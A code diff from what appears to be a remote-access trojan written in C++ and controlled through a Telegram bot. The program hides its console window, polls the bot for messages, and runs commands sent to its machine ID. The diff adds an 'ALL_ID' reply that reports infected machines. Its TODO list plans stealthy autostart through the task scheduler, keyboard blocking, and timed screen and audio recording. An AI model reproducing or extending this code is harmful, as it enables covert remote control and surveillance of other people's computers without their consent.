@@ -22,13 +22,14 @@ int main() {
 	if(HIDE_TERMINAL) ShowWindow(::GetConsoleWindow(), SW_HIDE);
 	startup();
 
+	int last(-1); 	fstream file;
+	file.open("last", ios::in);
+	file >> last;
+	file.close();
+
 	while (true) {
 		Sleep(REFRESH * 1000);
 		json message = GetLastMessage();
-		int last; 	fstream file;
-		file.open("last", ios::in);
-		file >> last;
-		file.close();
 
 		if (last == message["message_id"]) continue; //continue if that request is already done
 		if (time(nullptr) - message["date"] > REFRESH + 3) continue; //continue if that request is too old
@@ -40,6 +41,11 @@ int main() {
 		
 		string id = "", command = "", parameters = "";
 		string parse = message["text"];
+		if (parse == "ALL_ID") {
+			cout << "ALL_ID\n";
+			Send(ID);
+			continue;
+		}
 		queue<pair<string, string>> Q;
 		for (int i = 0, it = 0; i < parse.size(); i++)
 		{
@@ -66,7 +72,7 @@ int main() {
 		if (id.empty())continue;
 		bool done = true;
 		if (ID == id) { 
-		    cout << "ID passed, command: " + parse.substr(id.size()+1,4096) << endl;
+		    cout << "ID passed, command: " + parse.substr(id.size()+1, TELEGRAM_MAX) << endl;
 			while (!Q.empty()) {
 				if (Q.front().first.empty()) continue;
 				if (Q.front().second.empty())Q.front().second = "NULL";
@@ -79,15 +85,11 @@ int main() {
 
 /*
 * TODOLIST
--LIST OF FIRST PLAN APPS
--cmd bez okienek
--repair autostart()
--list of disks
--nagrywanie obrazu przez określony czas
--nagrywanie dźwięku przez określony czas
--custom autostart path
+-autostart using task sheduler (easy admin acess)
 -block keyboard
--Showing actual volume by `Volume` not works
--ogarnac handler na wylacznie sie
--sending pictures without 0x0.st
+-make a handler for turing off
+-custom autostart path
+-math()
+-recording screen for some time
+-recording audio for some time
 */
